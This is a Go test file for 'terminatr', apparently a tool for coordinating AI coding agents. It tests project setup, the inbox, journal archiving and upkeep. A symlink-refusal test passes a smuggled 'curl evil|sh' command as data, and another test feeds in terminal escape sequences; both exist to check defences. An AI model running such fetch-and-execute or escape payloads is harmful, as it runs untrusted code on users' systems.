package project

import (
	"archive/tar"
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/theclifmeister/terminatr/internal/caller"
	"github.com/theclifmeister/terminatr/internal/home"
	"github.com/theclifmeister/terminatr/internal/tasks"
)

var (
	human = caller.Caller{Kind: caller.Human}
	coord = caller.Caller{Kind: caller.Coordinator, Project: "demo-app"}
)

// setup points TERMINATR_HOME at a temp dir and fixes the clock.
func setup(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv(home.Env, dir)
	clock := time.Date(2026, 10, 4, 12, 0, 0, 0, time.UTC)
	now = func() time.Time { clock = clock.Add(time.Second); return clock }
	t.Cleanup(func() { now = time.Now })
	return dir
}

func TestSlugify(t *testing.T) {
	for in, want := range map[string]string{
		"Demo App":         "demo-app",
		"  Foo -- Bar!!  ": "foo-bar",
		"Ünïcode 2":        "n-code-2",
		"***":              "",
	} {
		if got := Slugify(in); got != want {
			t.Errorf("Slugify(%q) = %q, want %q", in, got, want)
		}
	}
	if ValidSlug("../x") || ValidSlug("") || !ValidSlug("a-1") {
		t.Fatal("ValidSlug")
	}
}

func TestNewLayout(t *testing.T) {
	root := setup(t)
	repo := t.TempDir()
	p, err := New(Options{Slug: "demo-app", Goal: "Ship it", Repos: []string{repo}})
	if err != nil {
		t.Fatal(err)
	}
	if p.Dir != filepath.Join(root, "projects", "demo-app") {
		t.Fatalf("dir %s", p.Dir)
	}
	for _, f := range []string{"PROJECT.md", "AGENTS.md", "CONTEXT.md", "MEMORY.md", "TASKS.md", "JOURNAL.md", "memory", "tasks", "inbox/done", "threads", "uploads"} {
		if _, err := os.Stat(p.Path(f)); err != nil {
			t.Errorf("missing %s", f)
		}
	}
	if target, err := os.Readlink(p.Path("CLAUDE.md")); err != nil || target != "AGENTS.md" {
		t.Fatalf("CLAUDE.md link: %q %v", target, err)
	}
	role, _ := os.ReadFile(p.Path("AGENTS.md"))
	if !strings.Contains(string(role), "tm skill coordinator") || !strings.Contains(string(role), "coordinator of the terminatr project demo-app.") {
		t.Fatalf("role file:\n%s", role)
	}

	q, err := Open("demo-app")
	if err != nil {
		t.Fatal(err)
	}
	if q.Meta.Goal != "Ship it" || len(q.Repos) != 1 || q.Repos[0] != repo {
		t.Fatalf("meta %+v", q.Meta)
	}
	if !strings.HasPrefix(q.Instructions, "# Instructions") {
		t.Fatalf("instructions %q", q.Instructions)
	}
	if _, err := New(Options{Slug: "demo-app"}); err == nil || !strings.Contains(err.Error(), "project-exists") {
		t.Fatalf("second new: %v", err)
	}
	// typed names become slugs; text with no letter or digit, or a taken slug, is refused
	if _, err := New(Options{Slug: "Demo App"}); err == nil || !strings.Contains(err.Error(), "project-exists") {
		t.Fatalf("typed name not slugified: %v", err)
	}
	if q, err := New(Options{Slug: "  My Other, App! "}); err != nil || q.Slug != "my-other-app" {
		t.Fatalf("slugified new: %v %v", q, err)
	}
	for _, bad := range []string{"-", "", "!!"} {
		if _, err := New(Options{Slug: bad}); err == nil || !strings.Contains(err.Error(), "invalid-project") {
			t.Fatalf("new %q: %v", bad, err)
		}
	}
	if _, err := New(Options{Slug: "x", Repos: []string{filepath.Join(repo, "nope")}}); err == nil || !strings.Contains(err.Error(), "invalid-repo") {
		t.Fatalf("bad repo: %v", err)
	}
	if _, err := Open("nope"); err == nil || !strings.Contains(err.Error(), "unknown-project") {
		t.Fatalf("open unknown: %v", err)
	}
}

// TestLegacyName: a PROJECT.md with the display name an older tm wrote
// loads unchanged, and the name goes when tm next rewrites the front
// matter (T137).
func TestLegacyName(t *testing.T) {
	setup(t)
	repo := t.TempDir()
	p, err := New(Options{Slug: "demo", Goal: "Ship it"})
	if err != nil {
		t.Fatal(err)
	}
	old := "+++\nname = \"Demo App\"\ngoal = \"Ship it\"\nrepos = []\ncreated = 2026-01-02T03:04:05Z\n+++\n# Instructions\n\nKeep it.\n"
	if err := os.WriteFile(p.Path("PROJECT.md"), []byte(old), 0o644); err != nil {
		t.Fatal(err)
	}
	q, err := Open("demo")
	if err != nil || q.Meta.Goal != "Ship it" || q.Instructions != "# Instructions\n\nKeep it." {
		t.Fatalf("open: %v %+v", err, q)
	}
	if l, err := List(); err != nil || len(l) != 1 || l[0].Slug != "demo" || l[0].Error != "" {
		t.Fatalf("list: %v %+v", err, l)
	}
	old = strings.Replace(old, "repos = []", "repos = ["+strconv.Quote(repo)+"]", 1)
	if err := os.WriteFile(p.Path("PROJECT.md"), []byte(old), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := MoveRepos(time.Now()); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(p.Path("PROJECT.md"))
	if strings.Contains(string(b), "name") || strings.Contains(string(b), "repos") || !strings.Contains(string(b), `goal = "Ship it"`) || !strings.Contains(string(b), "Keep it.") {
		t.Fatalf("rewritten:\n%s", b)
	}
}

func TestList(t *testing.T) {
	setup(t)
	if l, err := List(); err != nil || len(l) != 0 {
		t.Fatalf("empty list: %v %v", l, err)
	}
	New(Options{Slug: "beta"})
	p, _ := New(Options{Slug: "alpha"})
	p.Tasks().Add(human, []tasks.NewTask{{Title: "a", Status: "review"}, {Title: "b", Status: "ready"}})
	l, err := List()
	if err != nil || len(l) != 2 || l[0].Slug != "alpha" {
		t.Fatalf("list %+v %v", l, err)
	}
	if l[0].Counts["needs_you"] != 1 || l[0].Counts["on_deck"] != 1 {
		t.Fatalf("counts %+v", l[0].Counts)
	}
}

func TestResolve(t *testing.T) {
	root := setup(t)
	env := func(m map[string]string) func(string) string { return func(k string) string { return m[k] } }
	none := env(nil)
	sub := filepath.Join(root, "projects", "demo", "threads")
	wt := filepath.Join(root, "worktrees", "demo", "t-0001-fix")
	os.MkdirAll(sub, 0o755)
	os.MkdirAll(wt, 0o755)
	cases := []struct {
		flag string
		get  func(string) string
		cwd  string
		want string
	}{
		{"x", env(map[string]string{caller.EnvProject: "y"}), sub, "x"},
		{"", env(map[string]string{caller.EnvProject: "y"}), sub, "y"},
		{"", none, sub, "demo"},
		{"", none, wt, "demo"},
		{"", none, root, ""},
		{"", none, t.TempDir(), ""},
	}
	for _, c := range cases {
		got, err := Resolve(c.flag, c.get, c.cwd)
		if err != nil || got != c.want {
			t.Errorf("Resolve(%q, %q) = %q, %v; want %q", c.flag, c.cwd, got, err, c.want)
		}
	}
}

func TestDoneApproved(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo-app"})
	s := p.Tasks()
	s.Add(coord, []tasks.NewTask{{Title: "Ship"}, {Title: "Docs"}})
	_, err := s.SetStatus(coord, 1, tasks.Done, "")
	if err == nil || !strings.Contains(err.Error(), "human-only") {
		t.Fatalf("err %v", err)
	}
	if items, _ := p.Inbox(); len(items) != 0 {
		t.Fatalf("a refused done raised items: %+v", items)
	}
	if _, err := s.SetDoneApproved(coord, 1, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SetStatus(human, 2, tasks.Done, ""); err != nil {
		t.Fatal(err)
	}
	lines, _, _ := p.JournalTail(20)
	j := strings.Join(lines, "\n")
	for _, want := range []string{"human project.new demo-app", "coordinator task.add T1 Ship", "coordinator task.status T1 done (approved by the user)", "human task.status T2 done"} {
		if !strings.Contains(j, want) {
			t.Errorf("journal lacks %q:\n%s", want, j)
		}
	}
}

func TestContextDeterministicAndCapped(t *testing.T) {
	setup(t)
	repo := t.TempDir()
	p, _ := New(Options{Slug: "demo-app", Goal: "Ship v1", Repos: []string{repo}})
	s := p.Tasks()
	var items []tasks.NewTask
	for i := 0; i < 15; i++ {
		items = append(items, tasks.NewTask{Title: "done " + string(rune('a'+i)), Status: "done"})
	}
	items = append(items, tasks.NewTask{Title: "Fix login", Status: "started", Steps: []string{"a", "b"}})
	s.Add(human, items)
	var ctx strings.Builder
	for i := 0; i < 200; i++ {
		ctx.WriteString("line\n")
	}
	os.WriteFile(p.Path("CONTEXT.md"), []byte(ctx.String()), 0o644)
	p.AddItem("report", "t-0001", "t-0001 reported", false)

	seen := Ticked{Checkouts: map[string]string{p.Repos[0]: "local main is 3 behind origin (uncommitted changes)"},
		Queues: []HeldQueue{{Session: "s-28", Role: "coordinator", Queued: 1, Why: "prompt box not empty", Since: time.Date(2026, 10, 5, 19, 45, 49, 0, time.UTC)}}}
	sec1, err := p.Context(seen, nil)
	if err != nil {
		t.Fatal(err)
	}
	sec2, _ := p.Context(seen, nil)
	out := RenderContext(sec1)
	if out != RenderContext(sec2) {
		t.Fatal("context not deterministic")
	}
	for _, want := range []string{
		"Goal: Ship v1",
		"Repo: " + p.Repos[0] + " · local main is 3 behind origin (uncommitted changes)",
		"[… 80 more lines in CONTEXT.md]",
		"In motion (1)\n  T16  started  Fix login  0/2",
		"Done (15)",
		"Prompt queue: s-28 (coordinator) has 1 prompt(s) held since 2026-10-05 19:45 UTC (prompt box not empty)",
		"[… 12 done tasks not shown (tm task list)]",
		"report: t-0001 reported",
		"human task.add T16 Fix login",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("context lacks %q", want)
		}
	}
	if strings.Contains(out, "done a ") {
		t.Error("oldest done task not capped")
	}
	if t.Failed() {
		t.Log(out)
	}
}

// FuzzParseItem: an inbox file, whatever it holds, parses or fails
// without panicking, and a parsed item's fields are single lines.
func FuzzParseItem(f *testing.F) {
	f.Add([]byte("+++\nid = \"x\"\nkind = \"report\"\nsubject = \"t-0001\"\nsummary = \"t-0001 handed in report 1\"\nneeds_user = false\n+++\n"))
	f.Add([]byte("+++\nsummary = \"a\\nb\\rc\"\n+++\nbody"))
	f.Add([]byte("no front matter"))
	f.Fuzz(func(t *testing.T, data []byte) {
		it, err := ParseItem("id", data)
		if err != nil {
			return
		}
		for _, s := range []string{it.Kind, it.Subject, it.Summary} {
			if strings.ContainsAny(s, "\n\r") {
				t.Fatalf("multi-line field %q", s)
			}
		}
	})
}

// TestArchiveInbox: handled items older than the age move into their
// creation month's tarball, which keeps what it held; fresh ones stay
// loose, and unhandled ones aren't touched.
func TestArchiveInbox(t *testing.T) {
	setup(t)
	p, err := New(Options{Slug: "prune"})
	if err != nil {
		t.Fatal(err)
	}
	old, _ := p.AddItem("report", "t-0001", "old", false)
	older, _ := p.AddItem("report", "t-0003", "older", false)
	fresh, _ := p.AddItem("report", "t-0002", "fresh", false)
	open, _ := p.AddItem("report", "t-0004", "open", false)
	for _, it := range []*Item{old, older, fresh} {
		p.DoneItem(it.ID)
	}
	at := time.Date(2026, 10, 4, 12, 0, 0, 0, time.UTC)
	past := at.Add(-31 * 24 * time.Hour)
	os.Chtimes(p.Path("inbox", "done", old.ID+".md"), past, past)
	if n, err := p.ArchiveInbox(at, 30*24*time.Hour); err != nil || n != 1 {
		t.Fatalf("bundled %d, %v", n, err)
	}
	os.Chtimes(p.Path("inbox", "done", older.ID+".md"), past, past)
	if n, err := p.ArchiveInbox(at, 30*24*time.Hour); err != nil || n != 1 {
		t.Fatalf("second run bundled %d, %v", n, err)
	}
	for _, f := range []string{"inbox/done/" + fresh.ID + ".md", "inbox/" + open.ID + ".md"} {
		if _, err := os.Stat(p.Path(f)); err != nil {
			t.Errorf("%s moved: %v", f, err)
		}
	}
	// The items' ids say they were created 2026-10-04: that month's file.
	names := map[string]string{}
	f, err := os.Open(p.Path("inbox", "done", "2026-10.tar.gz"))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	zr, _ := gzip.NewReader(f)
	tr := tar.NewReader(zr)
	for {
		h, err := tr.Next()
		if err != nil {
			break
		}
		b, _ := io.ReadAll(tr)
		names[h.Name] = string(b)
	}
	if len(names) != 2 || !strings.Contains(names[old.ID+".md"], `summary = "old"`) || !strings.Contains(names[older.ID+".md"], `summary = "older"`) {
		t.Fatalf("tarball: %v", names)
	}
	if items, _ := p.Inbox(); len(items) != 1 || items[0].ID != open.ID {
		t.Fatalf("inbox: %+v", items)
	}
}

// TestArchiveJournal: journal lines older than the age go to their
// month's gzip file, appended; the heading and newer lines stay.
func TestArchiveJournal(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo"})
	os.WriteFile(p.Path("JOURNAL.md"), []byte("# Journal\n\n"+
		"2026-08-30T10:00:00Z human a\n2026-09-02T10:00:00Z human b\n2026-09-20T10:00:00Z human c\n2026-10-03T10:00:00Z human d\n"), 0o644)
	at := time.Date(2026, 10, 4, 12, 0, 0, 0, time.UTC)
	if n, err := p.ArchiveJournal(at, 20*24*time.Hour); err != nil || n != 2 {
		t.Fatalf("moved %d, %v", n, err)
	}
	if n, err := p.ArchiveJournal(at, 10*24*time.Hour); err != nil || n != 1 {
		t.Fatalf("second run moved %d, %v", n, err)
	}
	if n, _ := p.ArchiveJournal(at, 10*24*time.Hour); n != 0 {
		t.Fatalf("third run moved %d", n)
	}
	got, _ := os.ReadFile(p.Path("JOURNAL.md"))
	if string(got) != "# Journal\n\n2026-10-03T10:00:00Z human d\n" {
		t.Fatalf("JOURNAL.md:\n%s", got)
	}
	read := func(name string) string {
		f, err := os.Open(p.Path("journal", name))
		if err != nil {
			t.Fatal(err)
		}
		defer f.Close()
		zr, err := gzip.NewReader(f)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(zr)
		return string(b)
	}
	if a, s := read("2026-08.md.gz"), read("2026-09.md.gz"); a != "2026-08-30T10:00:00Z human a\n" ||
		s != "2026-09-02T10:00:00Z human b\n2026-09-20T10:00:00Z human c\n" {
		t.Fatalf("archives: %q %q", a, s)
	}
	if lines, total, _ := p.JournalTail(5); total != 1 || lines[0] != "2026-10-03T10:00:00Z human d" {
		t.Fatalf("tail: %v %d", lines, total)
	}
}

func TestAskDelegate(t *testing.T) {
	setup(t)
	p, err := New(Options{Slug: "delegate"})
	if err != nil {
		t.Fatal(err)
	}
	if asked, err := p.AskDelegate(human, "T3"); !asked || err != nil {
		t.Fatalf("first ask: %v, %v", asked, err)
	}
	// A second ask while the first is unhandled adds nothing.
	if asked, err := p.AskDelegate(human, "T3"); asked || err != nil {
		t.Fatalf("second ask: %v, %v", asked, err)
	}
	items, _ := p.Inbox()
	if len(items) != 1 || items[0].Kind != KindDelegate || items[0].Subject != "T3" || items[0].Summary != "the user asks to delegate T3" {
		t.Fatalf("items %+v", items)
	}
	if TaskAsked(items, "T3") != KindDelegate || TaskAsked(items, "T4") != "" {
		t.Fatal("TaskAsked")
	}
	lines, _, _ := p.JournalTail(5)
	if j := strings.Join(lines, "\n"); !strings.Contains(j, "human task.delegate.ask T3") {
		t.Fatalf("journal %q", j)
	}
	// Once handled, the user can ask again.
	p.DoneItem(items[0].ID)
	if asked, err := p.AskDelegate(human, "T3"); !asked || err != nil {
		t.Fatalf("ask after done: %v, %v", asked, err)
	}
}

// TestTookOver: the user's keys into a thread's pane make a takeover
// item and a journal line; from a paired server's console the item says
// which (docs/SPEC.md §16.12) and the journal names the peer.
func TestTookOver(t *testing.T) {
	setup(t)
	p, err := New(Options{Slug: "takeover"})
	if err != nil {
		t.Fatal(err)
	}
	if err := p.TookOver(human, "t-0004", "T7"); err != nil {
		t.Fatal(err)
	}
	if err := p.TookOver(caller.ForPeer("studio"), "t-0004", "T7"); err != nil {
		t.Fatal(err)
	}
	items, _ := p.Inbox()
	var summaries []string
	for _, it := range items {
		if it.Kind != KindTakeover || it.Subject != "t-0004" {
			t.Errorf("item %+v", it)
		}
		summaries = append(summaries, it.Summary)
	}
	slices.Sort(summaries)
	if want := []string{"the user typed into T7's pane", "the user typed into T7's pane from the paired server studio"}; !slices.Equal(summaries, want) {
		t.Errorf("summaries %q", summaries)
	}
	lines, _, _ := p.JournalTail(5)
	if j := strings.Join(lines, "\n"); !strings.Contains(j, "human thread.takeover t-0004") || !strings.Contains(j, "peer:studio thread.takeover t-0004") {
		t.Errorf("journal %q", j)
	}
}

func TestAskAcceptSendBack(t *testing.T) {
	setup(t)
	p, err := New(Options{Slug: "review"})
	if err != nil {
		t.Fatal(err)
	}
	if asked, err := p.AskAccept(human, "T5"); !asked || err != nil {
		t.Fatalf("accept: %v, %v", asked, err)
	}
	// One ask per task at a time: neither a second accept nor a
	// send-back is added while the accept waits.
	if asked, err := p.AskAccept(human, "T5"); asked || err != nil {
		t.Fatalf("second accept: %v, %v", asked, err)
	}
	if asked, err := p.AskSendBack(human, "T5", "too slow"); asked || err != nil {
		t.Fatalf("send-back over accept: %v, %v", asked, err)
	}
	if _, err := p.AskSendBack(human, "T6", " \t "); err == nil {
		t.Fatal("empty note accepted")
	}
	if _, err := p.AskSendBack(human, "T6", strings.Repeat("x", MaxSendBackNote+1)); err == nil {
		t.Fatal("long note accepted")
	}
	if asked, err := p.AskSendBack(human, "T6", "the bell\nis   cut off"); !asked || err != nil {
		t.Fatalf("send-back: %v, %v", asked, err)
	}
	items, _ := p.Inbox()
	if len(items) != 2 || items[0].Kind != KindAccept || items[0].Summary != "the user accepts T5" ||
		items[1].Kind != KindSendBack || items[1].Subject != "T6" || items[1].Summary != "the user sends T6 back: the bell is cut off" {
		t.Fatalf("items %+v", items)
	}
	if TaskAsked(items, "T5") != KindAccept || TaskAsked(items, "T6") != KindSendBack {
		t.Fatal("TaskAsked")
	}
	lines, _, _ := p.JournalTail(5)
	j := strings.Join(lines, "\n")
	for _, w := range []string{"human task.accept.ask T5", "human task.sendback.ask T6 the bell is cut off"} {
		if !strings.Contains(j, w) {
			t.Errorf("journal lacks %q: %q", w, j)
		}
	}
}

// TestUpkeep: context files over their budget are named in tm context's
// Upkeep section (and only then); done tasks leave the board after
// the given age, journaled as the caller's.
func TestUpkeep(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo-app"})
	render := func() string {
		secs, err := p.Context(Ticked{}, nil)
		if err != nil {
			t.Fatal(err)
		}
		return RenderContext(secs)
	}
	if over, err := p.Oversized(); err != nil || len(over) != 0 {
		t.Fatalf("fresh project: %v %v", over, err)
	}
	if strings.Contains(render(), "## Upkeep") {
		t.Fatal("an Upkeep section without anything over budget")
	}
	os.WriteFile(p.Path("CONTEXT.md"), []byte(strings.Repeat("x", BudgetContext+512)), 0o644)
	os.MkdirAll(p.Path("memory", "old"), 0o755)
	os.WriteFile(p.Path("memory", "old", "decisions.md"), []byte(strings.Repeat("y", BudgetNote+1024)), 0o644)
	os.WriteFile(p.Path("memory", "small.md"), []byte("ok\n"), 0o644)
	ctx := render()
	for _, w := range []string{"## Upkeep", "CONTEXT.md is 6.5 KB, over its 6 KB budget: consolidate it",
		"memory/old/decisions.md is 7 KB, over its 6 KB budget"} {
		if !strings.Contains(ctx, w) {
			t.Errorf("context lacks %q:\n%s", w, ctx)
		}
	}
	if strings.Contains(ctx, "small.md is") || strings.Contains(ctx, "memory/ is") {
		t.Error("a file within budget named")
	}
	// MEMORY.md has its own, smaller budget; the notes one together.
	os.WriteFile(p.Path("MEMORY.md"), []byte(strings.Repeat("z", BudgetIndex+1024)), 0o644)
	for i := range 6 {
		os.WriteFile(p.Path("memory", fmt.Sprintf("n%d.md", i)), []byte(strings.Repeat("n", BudgetNote)), 0o644)
	}
	over, err := p.Oversized()
	if err != nil {
		t.Fatal(err)
	}
	var files []string
	for _, o := range over {
		files = append(files, o.File)
	}
	if want := []string{"CONTEXT.md", "MEMORY.md", "memory/", "memory/old/decisions.md"}; !slices.Equal(files, want) {
		t.Fatalf("oversized %v, want %v", files, want)
	}
	if got, want := over[2].String(), "memory/ is 43.0 KB in all, over its 40 KB budget: consolidate it"; got != want {
		t.Errorf("total: %q, want %q", got, want)
	}
	if ctx := render(); !strings.Contains(ctx, "MEMORY.md is ") || !strings.Contains(ctx, "over its 4 KB budget") {
		t.Errorf("context lacks MEMORY.md over its budget:\n%s", ctx)
	}

	s := p.Tasks()
	s.Add(human, []tasks.NewTask{{Title: "Old"}, {Title: "Open"}})
	s.SetStatus(human, 1, tasks.Done, "")
	day := now()
	ticker := caller.Caller{Kind: caller.Ticker}
	const ArchiveDoneAfter = 30 * 24 * time.Hour
	if ids, err := p.ArchiveOldDone(ticker, day.Add(ArchiveDoneAfter-24*time.Hour), ArchiveDoneAfter); err != nil || len(ids) != 0 {
		t.Fatalf("archived too early: %v %v", ids, err)
	}
	if ids, err := p.ArchiveOldDone(ticker, day.Add(ArchiveDoneAfter+24*time.Hour), ArchiveDoneAfter); err != nil || len(ids) != 1 || ids[0] != 1 {
		t.Fatalf("archive: %v %v", ids, err)
	}
	if b, _ := s.Load(); b.Find(1) != nil || b.Find(2) == nil {
		t.Fatalf("board after archiving: %+v", b.Tasks)
	}
	lines, _, _ := p.JournalTail(5)
	if j := strings.Join(lines, "\n"); !strings.Contains(j, "ticker task.archive T1") {
		t.Errorf("journal:\n%s", j)
	}
}

// TestReadMemory: a project's memory is its CONTEXT.md, its MEMORY.md
// and its memory notes' titles (the first heading, else the file name),
// sorted; other files in memory/ are left out.
func TestInboxRows(t *testing.T) {
	items := []Item{
		{ID: "a", Kind: "report", Subject: "t-0001", Summary: "T1 Fix the login (t-0001) handed in report 1"},
		{ID: "b", Kind: "idle", Subject: "t-0001", Summary: "t-0001 is idle"},
		{ID: "c", Kind: "report", Subject: "t-0002", Summary: "t-0002 (Docs) handed in report 1"},
		{ID: "d", Kind: "report", Subject: "t-0001", Summary: "T1 Fix the login (t-0001) handed in report 2"},
	}
	rows := Rows(items)
	var got []string
	for _, r := range rows {
		got = append(got, fmt.Sprintf("%s %d %q|%q|%q", r.ID, r.Count, r.Task, r.What, r.Title))
	}
	want := []string{
		`b 1 ""|"t-0001 is idle"|""`,
		`c 1 ""|"t-0002 (Docs) handed in report 1"|""`,
		`d 2 "T1"|"handed in report 2"|"Fix the login"`,
	}
	if !slices.Equal(got, want) {
		t.Errorf("rows:\n%q\nwant\n%q", got, want)
	}
}

func TestDoneItems(t *testing.T) {
	t.Setenv("TERMINATR_HOME", t.TempDir())
	p, err := New(Options{Slug: "demo"})
	if err != nil {
		t.Fatal(err)
	}
	p.AddItem("report", "t-0001", "r1", false)
	p.AddItem("report", "t-0002", "other", false)
	p.AddItem("idle", "t-0001", "idle", false)
	if err := p.DoneItems("report", "t-0001"); err != nil {
		t.Fatal(err)
	}
	items, _ := p.Inbox()
	var got []string
	for _, it := range items {
		got = append(got, it.Summary)
	}
	slices.Sort(got)
	if !slices.Equal(got, []string{"idle", "other"}) {
		t.Fatalf("inbox: %+v", items)
	}
}

// TestRefreshRoleFile: a stale AGENTS.md of tm's is rewritten; the
// user's own is kept (T109).
func TestRefreshRoleFile(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo-app"})
	path := p.Path("AGENTS.md")
	os.WriteFile(path, []byte("# Coordinator of project Old\n\n"+roleFileMarker+" -->\nRun tm context.\n"), 0o644)
	if err := p.RefreshRoleFile(); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(path); string(b) != roleFile(p) {
		t.Fatalf("stale role file kept:\n%s", b)
	}
	os.WriteFile(path, []byte("my own notes\n"), 0o644)
	p.RefreshRoleFile()
	if b, _ := os.ReadFile(path); string(b) != "my own notes\n" {
		t.Fatalf("the user's file was rewritten:\n%s", b)
	}
}

// TestCountsBacklog: open tasks are the backlog, not on deck (T108).
func TestCountsBacklog(t *testing.T) {
	b := &tasks.Board{Tasks: []*tasks.Task{{ID: 1, Status: tasks.Open}, {ID: 2, Status: tasks.Ready}}}
	if c := Counts(b); c["backlog"] != 1 || c["on_deck"] != 1 {
		t.Fatalf("counts %v", c)
	}
}

// TestCodeHostOverride: PROJECT.md's code_host and azure_url reach the
// code host pick; a new project writes neither.
func TestCodeHostOverride(t *testing.T) {
	setup(t)
	p, err := New(Options{Slug: "demo-app"})
	if err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(p.Path("PROJECT.md"))
	if strings.Contains(string(b), "code_host") || strings.Contains(string(b), "azure_url") {
		t.Fatalf("written: %s", b)
	}
	if c := p.CodeHost(); c.CodeHost != "" || c.AzureURL != "" {
		t.Fatalf("%+v", c)
	}
	b = []byte(strings.Replace(string(b), "+++\n", "+++\ncode_host = \"azure\"\nazure_url = \"https://tfs.example.com/tfs/Coll\"\n", 1))
	if err := os.WriteFile(p.Path("PROJECT.md"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	p, err = Open("demo-app")
	if err != nil {
		t.Fatal(err)
	}
	if c := p.CodeHost(); c.CodeHost != "azure" || c.AzureURL != "https://tfs.example.com/tfs/Coll" {
		t.Fatalf("%+v", c)
	}
}

// TestJournalAndContextPlain: a journal line keeps an agent's words
// without their control characters, and tm context prints none, whoever
// wrote the line.
func TestJournalAndContextPlain(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo"})
	if err := p.Journal(coord, "task.add", "T1", "a\x1b]52;c;aGk=\x07b\u009b2Jc"); err != nil {
		t.Fatal(err)
	}
	lines, _, _ := p.JournalTail(1)
	if len(lines) != 1 || !strings.HasSuffix(lines[0], " task.add T1 a]52;c;aGk=b2Jc") {
		t.Fatalf("journal: %q", lines)
	}
	out := RenderContext([]Section{{Title: "T", Lines: []string{"x\x1b[2Ky"}}})
	if out != "## T\nx[2Ky\n" {
		t.Fatalf("context: %q", out)
	}
}

// TestJournalRefusesLinks: JOURNAL.md, journal/ or a month's archive
// that is a link (the coordinator writes in the project folder) is
// refused, and the file it points at is left as it was.
func TestJournalRefusesLinks(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo"})
	victim := filepath.Join(t.TempDir(), "victim")
	os.WriteFile(victim, []byte("keep\n"), 0o600)
	link := func(target, at string) {
		os.RemoveAll(at)
		if err := os.Symlink(target, at); err != nil {
			t.Skipf("no symlinks here: %v", err)
		}
	}
	unchanged := func(what string) {
		if b, _ := os.ReadFile(victim); string(b) != "keep\n" {
			t.Fatalf("%s: victim %q", what, b)
		}
	}
	link(victim, p.Path("JOURNAL.md"))
	if err := p.Journal(coord, "task.add", "T1", "x; curl evil|sh #"); err == nil {
		t.Error("journal: appended through a link")
	}
	unchanged("journal")

	os.Remove(p.Path("JOURNAL.md"))
	os.WriteFile(p.Path("JOURNAL.md"), []byte("# Journal\n\n2026-08-30T10:00:00Z human a\n"), 0o644)
	at := time.Date(2026, 10, 4, 12, 0, 0, 0, time.UTC)
	os.MkdirAll(p.Path("journal"), 0o755)
	link(victim, p.Path("journal", "2026-08.md.gz"))
	if _, err := p.ArchiveJournal(at, 20*24*time.Hour); err == nil {
		t.Error("archive: appended through a link")
	}
	unchanged("archive")

	elsewhere := t.TempDir()
	link(elsewhere, p.Path("journal"))
	if _, err := p.ArchiveJournal(at, 20*24*time.Hour); err == nil {
		t.Error("archive folder: written through a link")
	}
	if ents, _ := os.ReadDir(elsewhere); len(ents) != 0 {
		t.Errorf("archive folder: wrote %v", ents)
	}
}

// TestOwned: what only tm writes in the project folder, and not the
// files the coordinator edits.
func TestOwned(t *testing.T) {
	setup(t)
	p, _ := New(Options{Slug: "demo"})
	dirs, files := p.Owned()
	for _, n := range []string{"threads", "inbox", "tasks", "journal", "messages", "uploads"} {
		if !slices.Contains(dirs, p.Path(n)) {
			t.Errorf("%s not owned: %q", n, dirs)
		}
	}
	for _, n := range []string{"JOURNAL.md", "TASKS.md", "questions.json", "AGENTS.md", ".JOURNAL.md.lock", ".TASKS.md.lock", ".PROJECT.md.lock"} {
		if !slices.Contains(files, p.Path(n)) {
			t.Errorf("%s not owned: %q", n, files)
		}
	}
	for _, n := range []string{"CONTEXT.md", "MEMORY.md", "memory", "PROJECT.md"} {
		if slices.Contains(dirs, p.Path(n)) || slices.Contains(files, p.Path(n)) {
			t.Errorf("%s owned", n)
		}
	}
}

func TestOriginReposLeavesOutCheckoutThreads(t *testing.T) {
	dir := t.TempDir()
	for id, rec := range map[string]string{
		"t-1": "repo = \"/r/a\"\nstate = \"working\"\ncheckout = true\n",
		"t-2": "repo = \"/r/b\"\nstate = \"working\"\nadopted = true\n",
		"t-3": "repo = \"/r/c\"\nstate = \"resolved\"\ncheckout = true\n",
		"t-4": "repo = \"/r/d\"\nstate = \"working\"\n",
	} {
		if err := os.MkdirAll(filepath.Join(dir, "threads", id), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "threads", id, "thread.toml"), []byte(rec), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	p := &Project{Dir: dir, Repos: []string{"/r/a", "/r/b", "/r/c", "/r/d"}, Meta: Meta{AzureURL: "https://x.example"}}
	if got := p.CodeHost().OriginRepos; !slices.Equal(got, []string{"/r/c", "/r/d"}) {
		t.Fatalf("OriginRepos %v", got)
	}
	p.Meta.AzureURL = ""
	if got := p.CodeHost().OriginRepos; got != nil {
		t.Fatalf("no azure_url: %v", got)
	}
}
